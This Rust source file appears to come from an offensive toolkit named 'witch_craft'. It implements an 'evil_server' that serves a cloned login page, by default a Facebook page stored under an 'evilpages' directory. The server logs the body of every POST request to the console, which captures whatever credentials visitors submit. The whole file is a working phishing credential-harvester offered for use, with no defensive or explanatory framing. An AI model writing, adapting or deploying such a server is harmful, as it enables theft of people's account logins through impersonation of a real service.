use crate::core::core::*;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

fn handle_client(mut stream: TcpStream, file_path: &str) {
    let mut buffer = [0; 8192];
    stream.read(&mut buffer).unwrap();

    let mut path = file_path;
    if file_path.is_empty() {
        path = "/var/witch_craft/witch_spells/evilpages/facebook/facebook.html";
    }

    let index = fs::read_to_string(path).unwrap_or("Index file not found".to_string());

    let request = String::from_utf8_lossy(&buffer);
    let body = request.split("\r\n\r\n").nth(1).unwrap_or("");
    println!("Request: {}", &body);

    let response = if request.starts_with("GET / HTTP/1.1") {
        "HTTP/1.1 200 OK\r\n\r\n@@HTML".replace("@@HTML", &index)
    } else if request.starts_with("POST / HTTP/1.1") {
        "HTTP/1.1 200 OK\r\n\r\n@@HTML".replace("@@HTML", &index)
    } else {
        "HTTP/1.1 404 NOT FOUND\r\n\r\n@@HTML".replace("@@HTML", &index)
    };

    stream.write(response.as_bytes()).unwrap();
    stream.flush().unwrap();
}

pub fn evil_server(argsv: &[String]) -> i32 {
    let addrr = search_value("addrr", argsv);
    let file_path = search_key("path", argsv);
    let listener = TcpListener::bind(&addrr).unwrap();
    println!("{}", format!("Listening on {}", &addrr));

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_client(stream, &file_path);
            }
            Err(e) => {
                eprintln!("Error accepting connection: {}", e);
            }
        }
    }

    return 0;
}
